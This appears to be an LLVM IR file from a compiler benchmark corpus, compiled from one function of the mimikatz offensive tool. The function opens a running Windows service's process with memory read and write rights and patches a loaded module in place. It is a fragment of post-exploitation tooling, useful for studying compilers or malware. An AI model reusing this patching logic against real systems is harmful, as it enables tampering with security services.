; ModuleID = '/home/carl/AnghaBench/mimikatz/modules/extr_kull_m_patch.c_kull_m_patch_genericProcessOrServiceFromBuild.c'
source_filename = "/home/carl/AnghaBench/mimikatz/modules/extr_kull_m_patch.c_kull_m_patch_genericProcessOrServiceFromBuild.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_26__ = type { i32, i32*, i32* }
%struct.TYPE_23__ = type { %struct.TYPE_21__, %struct.TYPE_20__, %struct.TYPE_19__ }
%struct.TYPE_21__ = type { i32 }
%struct.TYPE_20__ = type { i32, i32 }
%struct.TYPE_19__ = type { i32, i32 }
%struct.TYPE_22__ = type { i64, i32 }
%struct.TYPE_24__ = type { i32, i32 }
%struct.TYPE_25__ = type { %struct.TYPE_18__ }
%struct.TYPE_18__ = type { i32, i32 }

@FALSE = common dso_local global i32 0, align 4
@KULL_M_MEMORY_GLOBAL_OWN_HANDLE = common dso_local global i32 0, align 4
@__const.kull_m_patch_genericProcessOrServiceFromBuild.aPatternMemory = private unnamed_addr constant %struct.TYPE_26__ { i32 0, i32* @KULL_M_MEMORY_GLOBAL_OWN_HANDLE, i32* null }, align 8
@__const.kull_m_patch_genericProcessOrServiceFromBuild.aPatchMemory = private unnamed_addr constant %struct.TYPE_26__ { i32 0, i32* @KULL_M_MEMORY_GLOBAL_OWN_HANDLE, i32* null }, align 8
@MIMIKATZ_NT_BUILD_NUMBER = common dso_local global i32 0, align 4
@SERVICE_RUNNING = common dso_local global i64 0, align 8
@PROCESS_VM_READ = common dso_local global i32 0, align 4
@PROCESS_VM_WRITE = common dso_local global i32 0, align 4
@PROCESS_VM_OPERATION = common dso_local global i32 0, align 4
@PROCESS_QUERY_INFORMATION = common dso_local global i32 0, align 4
@KULL_M_MEMORY_TYPE_PROCESS = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [22 x i32] [i32 34, i32 37, i32 115, i32 34, i32 32, i32 115, i32 101, i32 114, i32 118, i32 105, i32 99, i32 101, i32 32, i32 112, i32 97, i32 116, i32 99, i32 104, i32 101, i32 100, i32 10, i32 0], align 4
@.str.1 = private unnamed_addr constant [13 x i32] [i32 107, i32 117, i32 108, i32 108, i32 95, i32 109, i32 95, i32 112, i32 97, i32 116, i32 99, i32 104, i32 0], align 4
@.str.2 = private unnamed_addr constant [53 x i32] [i32 107, i32 117, i32 108, i32 108, i32 95, i32 109, i32 95, i32 112, i32 114, i32 111, i32 99, i32 101, i32 115, i32 115, i32 95, i32 103, i32 101, i32 116, i32 86, i32 101, i32 114, i32 121, i32 66, i32 97, i32 115, i32 105, i32 99, i32 77, i32 111, i32 100, i32 117, i32 108, i32 101, i32 73, i32 110, i32 102, i32 111, i32 114, i32 109, i32 97, i32 116, i32 105, i32 111, i32 110, i32 115, i32 70, i32 111, i32 114, i32 78, i32 97, i32 109, i32 101, i32 0], align 4
@.str.3 = private unnamed_addr constant [12 x i32] [i32 79, i32 112, i32 101, i32 110, i32 80, i32 114, i32 111, i32 99, i32 101, i32 115, i32 115, i32 0], align 4
@.str.4 = private unnamed_addr constant [24 x i32] [i32 83, i32 101, i32 114, i32 118, i32 105, i32 99, i32 101, i32 32, i32 105, i32 115, i32 32, i32 110, i32 111, i32 116, i32 32, i32 114, i32 117, i32 110, i32 110, i32 105, i32 110, i32 103, i32 10, i32 0], align 4
@.str.5 = private unnamed_addr constant [32 x i32] [i32 107, i32 117, i32 108, i32 108, i32 95, i32 109, i32 95, i32 115, i32 101, i32 114, i32 118, i32 105, i32 99, i32 101, i32 95, i32 103, i32 101, i32 116, i32 85, i32 110, i32 105, i32 113, i32 117, i32 101, i32 70, i32 111, i32 114, i32 78, i32 97, i32 109, i32 101, i32 0], align 4
@.str.6 = private unnamed_addr constant [33 x i32] [i32 73, i32 110, i32 99, i32 111, i32 114, i32 114, i32 101, i32 99, i32 116, i32 32, i32 118, i32 101, i32 114, i32 115, i32 105, i32 111, i32 110, i32 32, i32 105, i32 110, i32 32, i32 114, i32 101, i32 102, i32 101, i32 114, i32 101, i32 110, i32 99, i32 101, i32 115, i32 10, i32 0], align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @kull_m_patch_genericProcessOrServiceFromBuild(%struct.TYPE_23__* %0, i32 %1, i32 %2, i32 %3, i32 %4) #0 {
  %6 = alloca %struct.TYPE_23__*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.TYPE_22__, align 8
  %13 = alloca i32, align 4
  %14 = alloca %struct.TYPE_24__, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.TYPE_26__, align 8
  %17 = alloca %struct.TYPE_26__, align 8
  %18 = alloca %struct.TYPE_25__, align 4
  %19 = alloca %struct.TYPE_23__*, align 8
  store %struct.TYPE_23__* %0, %struct.TYPE_23__** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i32 %4, i32* %10, align 4
  %20 = load i32, i32* @FALSE, align 4
  store i32 %20, i32* %11, align 4
  %21 = bitcast %struct.TYPE_26__* %16 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 8 %21, i8* align 8 bitcast (%struct.TYPE_26__* @__const.kull_m_patch_genericProcessOrServiceFromBuild.aPatternMemory to i8*), i64 24, i1 false)
  %22 = bitcast %struct.TYPE_26__* %17 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 8 %22, i8* align 8 bitcast (%struct.TYPE_26__* @__const.kull_m_patch_genericProcessOrServiceFromBuild.aPatchMemory to i8*), i64 24, i1 false)
  %23 = load %struct.TYPE_23__*, %struct.TYPE_23__** %6, align 8
  %24 = load i32, i32* %7, align 4
  %25 = load i32, i32* @MIMIKATZ_NT_BUILD_NUMBER, align 4
  %26 = call %struct.TYPE_23__* @kull_m_patch_getGenericFromBuild(%struct.TYPE_23__* %23, i32 %24, i32 %25)
  store %struct.TYPE_23__* %26, %struct.TYPE_23__** %19, align 8
  %27 = icmp ne %struct.TYPE_23__* %26, null
  br i1 %27, label %28, label %114

28:                                               ; preds = %5
  %29 = load %struct.TYPE_23__*, %struct.TYPE_23__** %19, align 8
  %30 = getelementptr inbounds %struct.TYPE_23__, %struct.TYPE_23__* %29, i32 0, i32 2
  %31 = getelementptr inbounds %struct.TYPE_19__, %struct.TYPE_19__* %30, i32 0, i32 1
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds %struct.TYPE_26__, %struct.TYPE_26__* %16, i32 0, i32 0
  store i32 %32, i32* %33, align 8
  %34 = load %struct.TYPE_23__*, %struct.TYPE_23__** %19, align 8
  %35 = getelementptr inbounds %struct.TYPE_23__, %struct.TYPE_23__* %34, i32 0, i32 1
  %36 = getelementptr inbounds %struct.TYPE_20__, %struct.TYPE_20__* %35, i32 0, i32 1
  %37 = load i32, i32* %36, align 4
  %38 = getelementptr inbounds %struct.TYPE_26__, %struct.TYPE_26__* %17, i32 0, i32 0
  store i32 %37, i32* %38, align 8
  %39 = load i32, i32* %8, align 4
  %40 = call i64 @kull_m_service_getUniqueForName(i32 %39, %struct.TYPE_22__* %12)
  %41 = icmp ne i64 %40, 0
  br i1 %41, label %42, label %111

42:                                               ; preds = %28
  %43 = getelementptr inbounds %struct.TYPE_22__, %struct.TYPE_22__* %12, i32 0, i32 0
  %44 = load i64, i64* %43, align 8
  %45 = load i64, i64* @SERVICE_RUNNING, align 8
  %46 = icmp sge i64 %44, %45
  br i1 %46, label %47, label %108

47:                                               ; preds = %42
  %48 = load i32, i32* @PROCESS_VM_READ, align 4
  %49 = load i32, i32* @PROCESS_VM_WRITE, align 4
  %50 = or i32 %48, %49
  %51 = load i32, i32* @PROCESS_VM_OPERATION, align 4
  %52 = or i32 %50, %51
  %53 = load i32, i32* @PROCESS_QUERY_INFORMATION, align 4
  %54 = or i32 %52, %53
  %55 = load i32, i32* @FALSE, align 4
  %56 = getelementptr inbounds %struct.TYPE_22__, %struct.TYPE_22__* %12, i32 0, i32 1
  %57 = load i32, i32* %56, align 8
  %58 = call i32 @OpenProcess(i32 %54, i32 %55, i32 %57)
  store i32 %58, i32* %15, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %105

60:                                               ; preds = %47
  %61 = load i32, i32* @KULL_M_MEMORY_TYPE_PROCESS, align 4
  %62 = load i32, i32* %15, align 4
  %63 = call i64 @kull_m_memory_open(i32 %61, i32 %62, i32* %13)
  %64 = icmp ne i64 %63, 0
  br i1 %64, label %65, label %104

65:                                               ; preds = %60
  %66 = load i32, i32* %13, align 4
  %67 = load i32, i32* %9, align 4
  %68 = call i64 @kull_m_process_getVeryBasicModuleInformationsForName(i32 %66, i32 %67, %struct.TYPE_24__* %14)
  %69 = icmp ne i64 %68, 0
  br i1 %69, label %70, label %99

70:                                               ; preds = %65
  %71 = getelementptr inbounds %struct.TYPE_24__, %struct.TYPE_24__* %14, i32 0, i32 1
  %72 = load i32, i32* %71, align 4
  %73 = getelementptr inbounds %struct.TYPE_25__, %struct.TYPE_25__* %18, i32 0, i32 0
  %74 = getelementptr inbounds %struct.TYPE_18__, %struct.TYPE_18__* %73, i32 0, i32 1
  store i32 %72, i32* %74, align 4
  %75 = getelementptr inbounds %struct.TYPE_24__, %struct.TYPE_24__* %14, i32 0, i32 0
  %76 = load i32, i32* %75, align 4
  %77 = getelementptr inbounds %struct.TYPE_25__, %struct.TYPE_25__* %18, i32 0, i32 0
  %78 = getelementptr inbounds %struct.TYPE_18__, %struct.TYPE_18__* %77, i32 0, i32 0
  store i32 %76, i32* %78, align 4
  %79 = load %struct.TYPE_23__*, %struct.TYPE_23__** %19, align 8
  %80 = getelementptr inbounds %struct.TYPE_23__, %struct.TYPE_23__* %79, i32 0, i32 2
  %81 = getelementptr inbounds %struct.TYPE_19__, %struct.TYPE_19__* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 4
  %83 = load %struct.TYPE_23__*, %struct.TYPE_23__** %19, align 8
  %84 = getelementptr inbounds %struct.TYPE_23__, %struct.TYPE_23__* %83, i32 0, i32 1
  %85 = getelementptr inbounds %struct.TYPE_20__, %struct.TYPE_20__* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 4
  %87 = load %struct.TYPE_23__*, %struct.TYPE_23__** %19, align 8
  %88 = getelementptr inbounds %struct.TYPE_23__, %struct.TYPE_23__* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.TYPE_21__, %struct.TYPE_21__* %88, i32 0, i32 0
  %90 = load i32, i32* %89, align 4
  %91 = call i32 @kull_m_patch(%struct.TYPE_25__* %18, %struct.TYPE_26__* %16, i32 %82, %struct.TYPE_26__* %17, i32 %86, i32 %90, i32* null, i32 0, i32* null, i32* null)
  store i32 %91, i32* %11, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %96

93:                                               ; preds = %70
  %94 = load i32, i32* %8, align 4
  %95 = call i32 @kprintf(i8* bitcast ([22 x i32]* @.str to i8*), i32 %94)
  br label %98

96:                                               ; preds = %70
  %97 = call i32 @PRINT_ERROR_AUTO(i8* bitcast ([13 x i32]* @.str.1 to i8*))
  br label %98

98:                                               ; preds = %96, %93
  br label %101

99:                                               ; preds = %65
  %100 = call i32 @PRINT_ERROR_AUTO(i8* bitcast ([53 x i32]* @.str.2 to i8*))
  br label %101

101:                                              ; preds = %99, %98
  %102 = load i32, i32* %13, align 4
  %103 = call i32 @kull_m_memory_close(i32 %102)
  br label %104

104:                                              ; preds = %101, %60
  br label %107

105:                                              ; preds = %47
  %106 = call i32 @PRINT_ERROR_AUTO(i8* bitcast ([12 x i32]* @.str.3 to i8*))
  br label %107

107:                                              ; preds = %105, %104
  br label %110

108:                                              ; preds = %42
  %109 = call i32 @PRINT_ERROR(i8* bitcast ([24 x i32]* @.str.4 to i8*))
  br label %110

110:                                              ; preds = %108, %107
  br label %113

111:                                              ; preds = %28
  %112 = call i32 @PRINT_ERROR_AUTO(i8* bitcast ([32 x i32]* @.str.5 to i8*))
  br label %113

113:                                              ; preds = %111, %110
  br label %116

114:                                              ; preds = %5
  %115 = call i32 @PRINT_ERROR(i8* bitcast ([33 x i32]* @.str.6 to i8*))
  br label %116

116:                                              ; preds = %114, %113
  %117 = load i32, i32* %11, align 4
  ret i32 %117
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local %struct.TYPE_23__* @kull_m_patch_getGenericFromBuild(%struct.TYPE_23__*, i32, i32) #2

declare dso_local i64 @kull_m_service_getUniqueForName(i32, %struct.TYPE_22__*) #2

declare dso_local i32 @OpenProcess(i32, i32, i32) #2

declare dso_local i64 @kull_m_memory_open(i32, i32, i32*) #2

declare dso_local i64 @kull_m_process_getVeryBasicModuleInformationsForName(i32, i32, %struct.TYPE_24__*) #2

declare dso_local i32 @kull_m_patch(%struct.TYPE_25__*, %struct.TYPE_26__*, i32, %struct.TYPE_26__*, i32, i32, i32*, i32, i32*, i32*) #2

declare dso_local i32 @kprintf(i8*, i32) #2

declare dso_local i32 @PRINT_ERROR_AUTO(i8*) #2

declare dso_local i32 @kull_m_memory_close(i32) #2

declare dso_local i32 @PRINT_ERROR(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
